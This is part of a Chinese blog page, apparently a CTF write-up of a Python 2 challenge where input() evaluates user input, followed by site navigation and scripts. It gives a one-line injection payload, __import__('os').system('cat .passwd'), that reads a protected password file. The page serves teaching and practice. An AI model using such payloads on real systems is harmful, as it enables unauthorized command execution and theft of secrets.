+<h1 id="Python-input"><a href="#Python-input" class="headerlink" title="Python - input()"></a>Python - input()</h1><h2 id="Start-the-game-5"><a href="#Start-the-game-5" class="headerlink" title="Start the game"></a>Start the game</h2><p><strong>查看ch6文件</strong></p>
+<pre><code class="sh">app-script-ch6@challenge02:~$ cat ch6.py
+#!/usr/bin/python2
+
+import sys
+
+def youLose():
+    print &quot;Try again ;-)&quot;
+    sys.exit(1)
+
+
+try:
+    p = input(&quot;Please enter password : &quot;)
+except:
+    youLose()
+
+
+with open(&quot;.passwd&quot;) as f:
+    passwd = f.readline().strip()
+    try:
+        if (p == int(passwd)):
+            print &quot;Well done ! You can validate with this password !&quot;
+    except:
+        youLose()</code></pre>
+<p><strong>利用input()命令执行漏洞</strong></p>
+<pre><code class="sh">app-script-ch6@challenge02:~$ ./setuid-wrapper
+Please enter password : __import__(&#39;os&#39;).system(&#39;cat .passwd&#39;)</code></pre>
+<h2 id="Reference-5"><a href="#Reference-5" class="headerlink" title="Reference"></a>Reference</h2><p><strong>Python中input()函数漏洞及与raw_input()函数区别</strong></p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/wechat.png"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/Python%E9%BB%91%E5%B8%BD%E5%AD%90-Scapy%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85.html" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                Python黑帽子-Scapy网络的掌控者</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/%E6%B5%85%E8%B0%88Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/photos/BuuCTF.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                浅谈Redis未授权访问漏洞</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="https://0xgeekcat.github.io/" class="profile gravatar"><img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg" itemprop="image" alt="0xGeekCat" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="https://0xgeekcat.github.io/" itemprop="url" rel="author">0xGeekCat</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 0xGeekCat<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2018</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1","name":"/video/The-Pet-Girl-of-Sakurasou.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.1","name":"/video/The-Pet-Girl-of-Sakurasou.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <!-- 实现换肤功能 -->
+
+  <div class="skin-menu no-select" id="mainskin" style="position: fixed">
+ <div class="theme-controls row-container">
+  <ul class="menu-list">
+   <li id="white-bg"> <i class="fa fa-television" aria-hidden="true"></i></li>
+   <li id="sakura-bg"> <i class="iconfont icon-sakura"></i></li>
+   <li id="gribs-bg"> <i class="fa fa-slack" aria-hidden="true"></i></li>
+   <li id="KAdots-bg"> <i class="iconfont icon-dots"></i></li>
+   <li id="totem-bg"> <i class="fa fa-optin-monster" aria-hidden="true"></i></li>
+   <li id="pixiv-bg"> <i class="iconfont icon-pixiv"></i></li>
+   <li id="bing-bg"> <i class="iconfont icon-bing"></i></li>
+   <li id="dark-bg"> <i class="fa fa-moon-o" aria-hidden="true"></i></li>
+  </ul>
+ </div>
+</div>
+<canvas id="night-mode-cover"></canvas>
+
+  <div class="changeSkin-gear no-select">
+
+  <div class="keys" id="setbtn"> 
+
+   <span id="open-skinMenu"> 切换主题 | SCHEME TOOL  
+
+     <i class="iconfont icon-gear inline-block rotating"></i> 
+
+   </span>
+
+  </div>
+
+</div>
+
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">Mаксим0xGeekCat</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="https://github.com/0xGeekCat" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E7%94%9F%E6%B4%BB/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  生活
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E8%BD%AC%E8%BD%BD/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  转载
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            书单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/tags/%E5%B7%B2%E8%AF%BB/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  已读
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/%E6%9C%AA%E8%AF%BB/">
+                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                  未读
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+</body>
+</html>
